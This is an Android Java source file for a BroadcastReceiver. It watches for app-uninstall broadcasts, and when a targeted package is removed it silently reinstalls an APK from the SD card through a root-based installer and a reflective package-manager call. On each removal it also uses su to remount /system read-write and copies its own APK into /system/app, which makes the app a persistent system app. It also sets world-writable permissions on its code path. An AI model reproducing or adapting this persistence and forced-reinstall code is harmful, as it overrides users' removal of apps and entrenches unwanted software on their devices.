package com.txjs.wj.myapplication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.IPackageManager;
import android.net.Uri;
import android.os.IBinder;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;

/**
 * @author wangjun
 * @version 1.0
 * @date 2016/7/26
 */
public class Recy extends BroadcastReceiver {
    String apkPath="sdcard/1.apk";

    @Override
    public void onReceive(Context context, Intent intent){
        //接收卸载广播
        if (intent.getAction().equals("android.intent.action.PACKAGE_REMOVED")) {
            String packageName = intent.getDataString();
            System.out.println(packageName+"===");
            if(packageName.contains("com.example.installtest")){
                insert();
                onClick_install();
            }
            setSys(context);
        }
    }
    public  boolean RootCommand(String command) {

        Process process = null;
        DataOutputStream os = null;

        try {

            process = Runtime.getRuntime().exec("su");
            os = new DataOutputStream(process.getOutputStream());
            os.writeBytes(command + "\n");
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();

        } catch (Exception e) {
            Log.d("*** DEBUG ***", "ROOT REE" + e.getMessage());
            return false;

        } finally {

            try {
                if (os != null) {
                    os.close();
                }
                process.destroy();
            } catch (Exception e) {
            }
        }

        Log.d("*** DEBUG ***", "Root SUC ");
        return true;

    }
    private void  setSys(Context context){
        try {
            // 获取应用安装的路径
            String sourceDir = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).applicationInfo.sourceDir;
            // 安装目标路径
            String sourceTarget = "/system/app/" + context.getPackageName() + ".apk";
            File file = new File(sourceTarget);
            if (file.exists()){
                return;
            }
            // 挂载系统应用文件夹可读写，写入
            String apkRoot = "mount -o remount,rw /system" + "\n"+ "cat " + sourceDir + " > " + sourceTarget;
            // 执行指令
            RootCommand(apkRoot);
            // 修改权限
            String apkRoot1 = "chmod 644 " + sourceTarget;
            // 执行指令
            RootCommand(apkRoot1);
            // 转换后先验证是否转换成功，成功则弹出提示窗
            file = new File(sourceTarget);
            if (file.exists()) {
                System.out.println("成功");
            } else {
                System.out.println("失败");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private void insert(){
//        if (!isRootSystem()) {
//            Toast.makeText(MainActivity.this, "没有ROOT权限，不能使用秒装", Toast.LENGTH_SHORT).show();
//            return;
//        }
        try {
            String[] args2 = { "chmod", "604", "/"+apkPath};
            Runtime.getRuntime().exec(args2);
        } catch (IOException e) {
            e.printStackTrace();
            System.out.println(e.getMessage());
        }
        SilentInstall installHelper = new SilentInstall();
       installHelper.install("/"+apkPath);
    }
    public boolean onClick_install()
    {
//        if (!isRootSystem()) {
//            Toast.makeText(App.application, "没有ROOT权限，不能使用秒装", Toast.LENGTH_SHORT).show();
//            return false;
//        }else if(!isRoot()){
//            upgradeRootPermission(App.application.getPackageCodePath());
//        }
        File apkFile = new File(apkPath);
        try
        {
            Class<?> clazz = Class.forName("android.os.ServiceManager");
            Method method_getService = clazz.getMethod("getService",
                    String.class);
            IBinder bind = (IBinder) method_getService.invoke(null, "package");

            IPackageManager iPm = IPackageManager.Stub.asInterface(bind);
            iPm.installPackage(Uri.fromFile(apkFile), null, 2,
                    apkFile.getName());
        } catch (Exception e)
        {
            e.printStackTrace();
        }
        return true;
    }

    /**
     * 应用程序运行命令获取 Root权限，设备必须已破解(获得ROOT权限)
     *
     * @return 应用程序是/否获取Root权限
     */
    public static boolean upgradeRootPermission(String pkgCodePath) {
        Process process = null;
        DataOutputStream os = null;
        try {
            String cmd="chmod 777 " + pkgCodePath;
            process = Runtime.getRuntime().exec("su"); //切换到root帐号
            os = new DataOutputStream(process.getOutputStream());
            os.writeBytes(cmd + "\n");
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (Exception e) {
            return false;
        } finally {
            try {
                if (os != null) {
                    os.close();
                }
                process.destroy();
            } catch (Exception e) {
            }
        }
        return true;
    }

    public void onForwardToAccessibility(View view) {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        App.application.startActivity(intent);
    }

    public void onSmartInstall(View view) {
        if (TextUtils.isEmpty(apkPath)) {
            Toast.makeText(App.application, "请选择安装包！", Toast.LENGTH_SHORT).show();
            return;
        }
        Uri uri = Uri.fromFile(new File(apkPath));
        Intent localIntent = new Intent(Intent.ACTION_VIEW);
        localIntent.setDataAndType(uri, "application/vnd.android.package-archive");
        App.application.startActivity(localIntent);
    }

    /**
     * 判断手机是否拥有Root权限。
     * @return 有root权限返回true，否则返回false。
     */
    private final static int kSystemRootStateUnknow=-1;
    private final static int kSystemRootStateDisable=0;
    private final static int kSystemRootStateEnable=1;
    private static int systemRootState=kSystemRootStateUnknow;

    public static boolean isRootSystem()
    {
        if(systemRootState==kSystemRootStateEnable)
        {
            return true;
        }
        else if(systemRootState==kSystemRootStateDisable)
        {

            return false;
        }
        File f=null;
        final String kSuSearchPaths[]={"/system/bin/","/system/xbin/","/system/sbin/","/sbin/","/vendor/bin/"};
        try{
            for(int i=0;i<kSuSearchPaths.length;i++)
            {
                f=new File(kSuSearchPaths[i]+"su");
                if(f!=null&&f.exists())
                {
                    systemRootState=kSystemRootStateEnable;
                    return true;
                }
            }
        }catch(Exception e)
        {
        }
        systemRootState=kSystemRootStateDisable;
        return false;
    }
    /*是否root*/
    private boolean isRoot(){
        try
        {
            Process process = Runtime.getRuntime().exec("su");
            process.getOutputStream().write("exit\n".getBytes());
            process.getOutputStream().flush();
            int i = process.waitFor();
            if(0 == i){
                process = Runtime.getRuntime().exec("su");
                return true;
            }

        } catch (Exception e)
        {
            return false;
        }
        return false;
    }
}
